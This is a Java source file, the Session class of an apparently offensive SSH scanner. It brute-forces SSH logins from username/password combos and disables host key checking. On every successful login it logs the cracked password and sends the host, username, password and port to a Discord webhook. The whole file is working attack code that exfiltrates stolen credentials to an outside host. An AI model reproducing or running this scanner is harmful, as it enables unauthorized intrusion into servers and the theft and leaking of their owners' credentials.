package com.thisisnzed.sshscanner.session;

import com.jcraft.jsch.JSch;
import com.thisisnzed.sshscanner.arguments.Configuration;
import com.thisisnzed.sshscanner.combo.Combo;
import com.thisisnzed.sshscanner.utils.DiscordWebhook;
import com.thisisnzed.sshscanner.utils.Logger;

import java.util.Properties;

public class Session {

    private final Configuration configuration;
    private final JSch jSch;
    private final Properties properties;
    private final String falsePositive;

    public Session(final Combo combo, final Configuration configuration, final JSch jSch, final Properties properties) {
        this.falsePositive = combo.getCombo().get(0)[0] + ":" + combo.getCombo().get(0)[1];
        this.configuration = configuration;
        this.jSch = jSch;
        this.properties = properties;
        this.properties.put("StrictHostKeyChecking", "no");
    }

    public boolean connect(final String host, final String username, final String password) {
        final int port = Integer.parseInt(String.valueOf(this.configuration.get("port")));
        try {
            final com.jcraft.jsch.Session session = this.jSch.getSession(username, host, port);
            session.setPassword(password);
            session.setConfig(this.properties);
            session.setTimeout(Integer.parseInt(String.valueOf(this.configuration.get("timeout"))));
            session.connect();
            if (!(username + ":" + password).equals(this.falsePositive)) {
                Logger.log("[" + Thread.currentThread().getId() + "] " + username + "@" + host + ":" + port + " (password: " + password + ") | Connected");
                new DiscordWebhook((String) this.configuration.get("webhook")).sendWebhook(host, username, password, port);
            }
            session.disconnect();
            return false;
        } catch (final Exception exception) {
            if (Boolean.parseBoolean(String.valueOf(this.configuration.get("verbose"))))
                Logger.log("[" + Thread.currentThread().getId() + "] " + username + "@" + host + ":" + port + " (password: " + password + ") | " + exception.getMessage());
            return exception.getMessage().toLowerCase().contains("auth fail");
        }
    }
}
